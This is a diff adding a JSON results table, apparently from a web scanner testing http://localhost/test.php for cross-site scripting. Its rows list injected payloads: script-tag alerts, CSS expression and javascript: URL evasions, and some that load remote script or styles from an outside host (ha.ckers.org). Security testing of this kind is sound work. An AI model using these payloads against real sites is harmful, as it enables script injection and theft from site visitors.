@@ -1,0 +1,28 @@
+{ "aaData": [ 
+
+["<a href=\"../response_sources/jGdUoWrpb.html\">200 </a>","http://localhost/test.php?ola=&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;","XSS","&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;"],
+
+["<a href=\"../response_sources/SWzIsSzPFDDx.html\">200 </a>","http://localhost/test.php?ola='';!--&quot;&lt;XSS&gt;=&{()}","XSS","'';!--&quot;&lt;XSS&gt;=&{()}"],
+
+["<a href=\"../response_sources/dztxfaljjtO.html\">200 </a>","http://localhost/test.php?ola=&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;","XSS","&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;"],
+
+["<a href=\"../response_sources/I.html\">200 </a>","http://localhost/test.php?ola=&lt;SCRIPT&gt;a=/XSS/","XSS","&lt;SCRIPT&gt;a=/XSS/"],
+
+["<a href=\"../response_sources/zXnlPjm.html\">200 </a>","http://localhost/test.php?ola=\\&quot;;alert('XSS');//","XSS","\\&quot;;alert('XSS');//"],
+
+["<a href=\"../response_sources/dGyu.html\">200 </a>","http://localhost/test.php?ola=&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;","xss","&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;"],
+
+["<a href=\"../response_sources/EYlQDmkaUMld.html\">200 </a>","http://localhost/test.php?ola=&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;","xss","&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;"],
+
+["<a href=\"../response_sources/ERdmdCLqp.html\">200 </a>","http://localhost/test.php?ola=&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;","XSS","&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;"],
+
+["<a href=\"../response_sources/bdAGJBbxfB.html\">200 </a>","http://localhost/test.php?ola=&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;","XSS","&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;"],
+
+["<a href=\"../response_sources/VeYHeSuR.html\">200 </a>","http://localhost/test.php?ola=exp/*&lt;XSS STYLE='no\\xss:noxss(&quot;*//*&quot;);","XSS","exp/*&lt;XSS STYLE='no\\xss:noxss(&quot;*//*&quot;);"],
+
+["<a href=\"../response_sources/SvQVkvyxLpAot.html\">200 </a>","http://localhost/test.php?ola=&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;","XSS","&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;"],
+
+["<a href=\"../response_sources/V.html\">200 </a>","http://localhost/test.php?ola=getURL(&quot;javascript:alert('XSS')&quot;)","XSS","getURL(&quot;javascript:alert('XSS')&quot;)"],
+
+ ["","","",""] 
+ ] }
